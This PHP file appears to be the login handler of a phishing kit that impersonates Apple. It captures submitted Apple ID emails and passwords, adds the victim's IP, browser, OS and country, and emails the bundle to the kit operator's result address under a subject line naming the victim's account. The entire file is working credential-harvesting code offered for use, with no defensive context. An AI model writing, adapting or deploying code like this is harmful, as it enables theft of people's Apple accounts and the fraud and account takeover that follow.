<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
require_once(dirname(dirname(__DIR__)).'/autoloader.php');
if(isset($_POST))
{

    $email = $core->post('xuser');
    $pass  = $core->post('xpass');
    
    $core->getEmpass($email,$pass);
    
    $data =['appleid' => $email ,
            'password' => $pass, 
            'useragent' => $_SERVER['HTTP_USER_AGENT'] , 
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')
        ];

    $sendMsg = $core->parse_result('account',$data);
    $core->stats('login',$email.' was logged in');
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
    $sendSubj = "APPLEID ACCOUNT : ".strtoupper($email)." # $info ";
    $sendFrom = "#HijaIyh:App";

    $core->create_session($data);

    if($core->parse_hijaiyh('sp','send_login') == 1){
       
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
	}

    echo "ok";
    
}